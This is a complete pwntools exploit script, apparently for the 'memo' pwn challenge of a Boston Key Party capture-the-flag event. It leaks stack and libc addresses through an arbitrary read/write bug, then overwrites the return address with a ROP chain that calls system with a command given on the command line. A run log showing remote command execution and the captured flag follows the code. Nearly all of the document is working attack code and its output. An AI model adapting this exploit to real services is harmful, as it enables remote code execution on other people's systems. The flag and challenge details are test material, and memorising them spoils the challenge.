#!/usr/bin/env python

from pwn import *
import sys
import IPython

binary = "./memo"
elf = ELF(binary)

def connect(username,password):
    global p
    #p = process(binary)
    p = remote("54.202.7.144",8888)
    p.recvuntil("What's user name: ")
    p.send_raw(username)

    p.recvuntil("Do you wanna set password? (y/n) ")

    if password != None:
        p.sendline("y")
        p.recvuntil("Password: ")
        p.send_raw(password)
    else:
        p.sendline("n")

    p.recvuntil(">> ")

def leave_message(index,length,msg):
    p.sendline("1")
    p.recvuntil("Index: ")
    p.sendline(str(index))

    if "length" not in p.recv(6).lower():
        p.recvuntil(">> ")
        return False

    p.sendline(str(length))

    p.recv(6)
    
    p.send_raw(msg)

    p.recvuntil(">> ")
    return True
        
def edit_message(msg):
    p.sendline("2")
    p.recvuntil("Edit message: ")
    p.send_raw(msg)
    p.recvuntil(">> ")
    return True

def view_memo(index):
    p.sendline("3")
    p.recvuntil("Index: ")
    p.sendline(str(index))
    p.recvuntil("View Message: ")
    ret = p.recvuntil("\n\n",drop=True)
    p.recvuntil(">> ")
    return ret

def change_password(oldpass,newusername,newpass):
    p.sendline("5")
    p.recvuntil("Password: ")
    p.sendline(oldpass)

    if p.recv(3) != "New":
        # Failed to change pass
        return False

    p.recvuntil("user name: ")

    p.sendline(newusername)
    p.recvuntil("New password: ")
    p.sendline(newpass)

    p.recvuntil(">> ")

    return True
    
def mem_write(addr,value,size):
    global username
    global password    

    # Bad chars
    if "\x0a" in p64(addr) or "\x0a" in p32(size) or "\x0a" in value:
        return False

    new_username = "A"*0x10 + p64(addr) + "\n" # Write to addr
    new_password = p32(size) + "\x00" # Number of bytes to read

    # Setup our pointers
    if not change_password(password,new_username,new_password):
        return False

    # Remember our pass
    password = new_password

    if not edit_message(value + "\n"): # Write to memory address
        return False
    
    return True

@memleak.MemLeak    
def mem_read(addr):
    # Write our read address into aMemoPointers address
    success = mem_write(aMemoPointers,p64(addr),32)
    
    if not success:
        return False

    # Read it out
    memo = view_memo(0)
    
    if memo == "":
        return "\x00"

    return memo

def leak_stack():

    leave_message(1,32,"Hello") # Move a stack pointer to 0x602AA0

    # Reset our arbitrary read/write
    leave_message(-8,None,None)
    return mem_read.q(0x602AA0)



data_seg = 0x602B00
puts_ptr = 0x601F80
aMemoPointers = 0x602A70
read = 0x601FA8

username = "A"*20
password = "B"*10 + "\x00"

connect(username,password)

# Use this to set the index
leave_message(-8,None,None)

stack = leak_stack()

print("Found stack at: " + hex(stack))

ret_ptr = stack + 88

print("Return Pointer at: " + hex(ret_ptr))

# Leak the address of printf
printf = mem_read.q(0x601F98)

print("Found printf at: " + hex(printf))

my_system_offset = 66672
their_system_offset = 66608
system_offset = their_system_offset

system = printf - system_offset

command = "ls -la\x00"
command = sys.argv[1] + "\x00"
command_addr = 0x602100

mem_write(command_addr,command,32)

######
# ROP
######

rop = ""
rop += p64(0x401263) # Pop rdi
rop += p64(command_addr) # This is rdi
rop += p64(system) # Jump to system

rop_chain_addr = 0x602000

print("Overwriting ret pointer")
mem_write(ret_ptr,rop,128)

print("Triggering exploit")
p.sendline("6")
p.interactive()

# bkp{you are a talented and ambitious hacker}

"""
$ ./win.py "ls -la /home/memo"
[!] Couldn't find relocations against PLT to get symbols
[*] '/home/user/bkp/pwn/memo/memo'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE
[+] Opening connection to 54.202.7.144 on port 8888: Done
Found stack at: 0x7fffba426dd0
Return Pointer at: 0x7fffba426e28
Found printf at: 0x7f6e17bf07b0
Overwriting ret pointer
Triggering exploit
[*] Switching to interactive mode
good bye
total 40
drwxr-xr-x 2 memo memo  4096 Feb 25 00:37 .
drwxr-xr-x 3 root root  4096 Feb 25 00:37 ..
-rw-r--r-- 1 memo memo   220 Aug 31  2015 .bash_logout
-rw-r--r-- 1 memo memo  3771 Aug 31  2015 .bashrc
-rw-r--r-- 1 memo memo   675 Aug 31  2015 .profile
-rw-r--r-- 1 root root    45 Feb 25 00:37 flag
-rwxr-xr-x 1 root root 12744 Feb 25 00:37 memo
[*] Got EOF while reading in interactive
$ 
[*] Closed connection to 54.202.7.144 port 8888
$ ./win.py "cat /home/memo/flag"
[!] Couldn't find relocations against PLT to get symbols
[*] '/home/user/bkp/pwn/memo/memo'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE
[+] Opening connection to 54.202.7.144 on port 8888: Done
Found stack at: 0x7fff7fa4eb10
Return Pointer at: 0x7fff7fa4eb68
Found printf at: 0x7f4a365b27b0
Overwriting ret pointer
Triggering exploit
[*] Switching to interactive mode
good bye
bkp{you are a talented and ambitious hacker}
[*] Got EOF while reading in interactive
$ 
[*] Interrupted
[*] Closed connection to 54.202.7.144 port 8888
"""
